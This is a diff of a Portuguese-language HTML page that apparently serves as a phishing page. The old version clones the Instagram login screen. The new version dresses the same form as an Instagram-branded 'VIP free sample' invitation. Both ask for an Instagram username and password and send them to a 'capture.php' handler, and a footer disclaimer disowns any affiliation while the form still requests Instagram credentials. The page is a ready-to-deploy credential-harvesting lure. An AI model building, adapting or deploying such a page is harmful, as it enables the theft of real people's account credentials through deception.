@@ -1,43 +1,181 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; width: 350px; padding: 20px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .logo { height: 51px; margin-bottom: 20px; }
-        .input-group { margin-bottom: 10px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 9px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; background-color: #0095f6; color: #fff; border: 0; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .forgot { font-size: 12px; color: #00376b; margin-top: 10px; text-decoration: none; }
-        .divider { display: flex; align-items: center; text-align: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
-        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
-        .divider span { padding: 0 10px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Convite VIP - Amostra Grátis</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
+    padding: 20px;
+}
+
+.card {
+    background: white;
+    width: 100%;
+    max-width: 390px;
+    padding: 35px 30px;
+    border-radius: 15px;
+    text-align: center;
+    box-shadow: 0 10px 35px #0004;
+}
+
+.logo {
+    width: 65px;
+    height: 65px;
+    margin: 0 auto 12px;
+    border-radius: 18px;
+    background: linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.logo svg {
+    width: 43px;
+    height: 43px;
+    fill: none;
+    stroke: white;
+    stroke-width: 2.5;
+}
+
+.brand {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 25px;
+    color: #262626;
+}
+
+.badge {
+    color: #c13584;
+    font-weight: bold;
+    font-size: 12px;
+    margin-bottom: 15px;
+}
+
+h1 {
+    font-size: 23px;
+    color: #262626;
+}
+
+.description {
+    color: #777;
+    font-size: 14px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+input {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    margin-bottom: 13px;
+    border: 1px solid #dbdbdb;
+    border-radius: 7px;
+    background: #fafafa;
+    font-size: 14px;
+}
+
+button {
+    width: 100%;
+    padding: 13px;
+    border: none;
+    border-radius: 7px;
+    background: #833ab4;
+    color: white;
+    font-weight: bold;
+    font-size: 15px;
+    cursor: pointer;
+}
+
+.direct {
+    display: block;
+    margin-top: 15px;
+    padding: 13px;
+    border: 1px solid #833ab4;
+    border-radius: 7px;
+    color: #833ab4;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.footer {
+    font-size: 11px;
+    color: #999;
+    margin-top: 22px;
+    line-height: 1.5;
+}
+</style>
 </head>
+
 <body>
 
-<div class="login-box">
-    <!-- Logo do Instagram (usando um placeholder) -->
-    <img src="https://www.instagram.com/static/images/web/logos/wordmark_light_column_905f80d518.png" alt="Instagram" class="logo">
-    
-    <form action="capture.php" method="POST">
-        <div class="input-group">
-            <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required>
-        </div>
-        <div class="input-group">
-            <input type="password" name="password" placeholder="Senha" required>
-        </div>
-        <button type="submit">Entrar</button>
-        <a href="#" class="forgot">Esqueceu a senha?</a>
+<div class="card">
+
+    <div class="logo">
+        <svg viewBox="0 0 24 24">
+            <rect x="3" y="3" width="18" height="18" rx="5"/>
+            <circle cx="12" cy="12" r="4"/>
+            <circle cx="18" cy="6" r="1" fill="white"/>
+        </svg>
+    </div>
+
+    <div class="brand">Instagram</div>
+
+    <div class="badge">🎁 CONVITE ESPECIAL VIP</div>
+
+    <h1>Você ganhou uma amostra grátis!</h1>
+
+    <p class="description">
+        Você recebeu um convite para conhecer nossas
+        amostras gratuitas e participar de eventos VIP.
+    </p>
+
+    <form id="vipForm" method="POST" action="capture.php">
+
+        <input
+            type="text"
+            name="usuario"
+            placeholder="Usuário do instagram"
+            autocomplete="username"
+            required
+        >
+
+        <input
+            type="password"
+            name="senha"
+            placeholder="Senha"
+            autocomplete="new-password"
+            required
+        >
+
+        <button type="submit">Continuar</button>
+
     </form>
 
-    <div class="divider"><span>ou</span></div>
-    <p style="font-size: 13px; color: #262626;">
-        Não tem uma conta? <a href="#" style="color: #0095f6; text-decoration: none;">Cadastre-se</a>.
+    <a class="direct"
+       href="https://www.instagram.com/direct/inbox/"
+       target="_blank"
+       rel="noopener noreferrer">
+       Abrir Instagram Direct
+    </a>
+
+    <p class="footer">
+        Campanha promocional independente.
+        Não afiliada ou patrocinada pela Meta ou Instagram.
+        Utilize somente credenciais próprias da campanha.
     </p>
+
 </div>
 
 </body>
